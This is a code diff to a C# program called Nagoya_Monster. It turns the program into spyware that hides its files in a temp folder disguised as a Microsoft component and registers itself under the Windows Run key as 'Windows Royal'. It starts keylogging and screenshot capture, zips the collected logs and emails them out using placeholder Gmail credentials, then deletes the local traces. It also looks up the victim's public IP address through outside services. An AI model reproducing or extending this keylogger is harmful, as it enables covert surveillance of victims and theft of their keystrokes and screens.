@@ -1,46 +1,129 @@
 ﻿using System;
+using System.IO;
+using System.IO.Compression;
+using System.Net;
 
 namespace Nagoya_Monster
 {
     class Program
     {
-        private const bool isRelease = false;
-        public static bool isDebugging;
-        public static bool isRunning = true;  
+        public static string TempPath = Path.GetTempPath() + @"MicrosoftRoyal\";
+        public static string LogPath = TempPath + "ToolboxVersion.dat";
+        public static string SSPath = TempPath + @"TaskRunnerExplorer\";
+        public static string ZipPath = Path.GetTempPath() + "MicrosoftRoyal.zip";
+        public static string EmailUser = "example@gmail.com";
+        public static string EmailPass = "EmailPassword";
 
-        private static void Main(string[] args)
+        public static void Main(string[] args)
         {
-            ManageArgs(args);
-            Log.Add("Nagoya Monster Started");
-            StartDeamons();
+            Program prg = new Program();
+            prg.Start();
         }
 
-        private static void ManageArgs(string[] args)
+        public void Start()
         {
-            if (args.Length > 0)
-            {
-                if (args[0] == "debug")
-                {
-                    if (isRelease)
-                    {
-                        #pragma warning disable CS0162 // Unreachable code detected
-                        Environment.Exit(0);
-                        #pragma warning restore CS0162 // Unreachable code detected
-                    }
-                    isDebugging = true;
-                }
-                else
-                {
-                    isDebugging = true;
-                }
-            }
+            Setup();
+            StartDeamons();
         }
 
         private static void StartDeamons()
         {
-            Log.Add("Nagoya Monster Started");
             Keylog.Start();
-            Screenshot.TakeScreenShot();
+            Screenshot.Start();
+        }
+
+        private static void Setup()
+        {
+            RegistrerStartup();
+            CreateFolders();
+            UploadLogs();
+        }
+
+        private static void RegistrerStartup()
+        {
+            Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Windows Royal", System.Reflection.Assembly.GetExecutingAssembly().Location);
+        }
+
+        private static void CreateFolders()
+        {
+            if (!Directory.Exists(SSPath))
+                Directory.CreateDirectory(SSPath);
+        }
+
+        private static void UploadLogs()
+        {
+            if (!IsConnectedToInternet())
+                return;
+
+            try
+            {
+                if (File.Exists(ZipPath))
+                    File.Delete(ZipPath);
+
+                ZipFile.CreateFromDirectory(TempPath, ZipPath);
+
+                Mail.Send("Logs", ZipPath);
+
+                DirectoryInfo di = new DirectoryInfo(TempPath);
+
+                foreach (FileInfo file in di.GetFiles())
+                    file.Delete();
+
+                foreach (DirectoryInfo dir in di.GetDirectories())
+                    dir.Delete(true);
+
+                CreateFolders();
+
+                if (File.Exists(ZipPath))
+                    File.Delete(ZipPath);
+            }
+            catch
+            {
+
+
+            }
+        }
+
+        public static bool IsConnectedToInternet()
+        {
+            try
+            {
+                using (var client = new WebClient())
+                {
+                    using (client.OpenRead("http://clients3.google.com/generate_204"))
+                    {
+                        return true;
+                    }
+                }
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        public static string GetIpAdress()
+        {
+            try
+            {
+                return new WebClient().DownloadString("http://bot.whatismyipaddress.com/");
+            }
+            catch
+            {
+                return null;
+            }
+        }
+
+        public static string GetIpAdress1()
+        {
+            try
+            {
+                return new WebClient().DownloadString("http://ipinfo.io/ip");
+            }
+            catch
+            {
+                return null;
+            }
         }
     }
 }
